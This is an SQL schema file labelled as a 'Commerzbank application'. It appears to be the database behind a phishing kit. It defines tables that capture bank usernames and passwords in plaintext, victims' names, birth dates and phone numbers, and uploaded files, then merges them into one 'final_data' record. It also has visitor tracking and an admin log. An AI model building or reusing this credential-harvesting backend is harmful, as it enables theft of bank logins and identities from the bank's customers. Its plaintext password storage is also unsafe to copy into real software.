-- Create tables for Commerzbank application
CREATE TABLE IF NOT EXISTS user_sessions (
    id TEXT PRIMARY KEY,
    session_id TEXT UNIQUE NOT NULL,
    ip TEXT NOT NULL,
    user_agent TEXT NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS login_data (
    id TEXT PRIMARY KEY,
    session_id TEXT UNIQUE NOT NULL,
    xusr TEXT NOT NULL,
    xpss TEXT NOT NULL,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    ip TEXT NOT NULL,
    user_agent TEXT NOT NULL,
    FOREIGN KEY (session_id) REFERENCES user_sessions(session_id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS info_data (
    id TEXT PRIMARY KEY,
    session_id TEXT UNIQUE NOT NULL,
    xname1 TEXT NOT NULL,
    xname2 TEXT NOT NULL,
    xdob TEXT NOT NULL,
    xtel TEXT NOT NULL,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    ip TEXT NOT NULL,
    user_agent TEXT NOT NULL,
    FOREIGN KEY (session_id) REFERENCES user_sessions(session_id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS upload_data (
    id TEXT PRIMARY KEY,
    session_id TEXT UNIQUE NOT NULL,
    filename TEXT,
    original_name TEXT,
    file_size INTEGER,
    file_path TEXT,
    mime_type TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    ip TEXT NOT NULL,
    user_agent TEXT NOT NULL,
    FOREIGN KEY (session_id) REFERENCES user_sessions(session_id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS final_data (
    id TEXT PRIMARY KEY,
    session_id TEXT UNIQUE NOT NULL,
    xusr TEXT NOT NULL,
    xpss TEXT NOT NULL,
    xname1 TEXT NOT NULL,
    xname2 TEXT NOT NULL,
    xdob TEXT NOT NULL,
    xtel TEXT NOT NULL,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    ip TEXT NOT NULL,
    user_agent TEXT NOT NULL,
    FOREIGN KEY (session_id) REFERENCES user_sessions(session_id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS site_visitors (
    id TEXT PRIMARY KEY,
    ip TEXT NOT NULL,
    user_agent TEXT NOT NULL,
    path TEXT NOT NULL,
    method TEXT DEFAULT 'GET',
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS admin_logs (
    id TEXT PRIMARY KEY,
    action TEXT NOT NULL,
    details TEXT,
    ip TEXT NOT NULL,
    user_agent TEXT NOT NULL,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
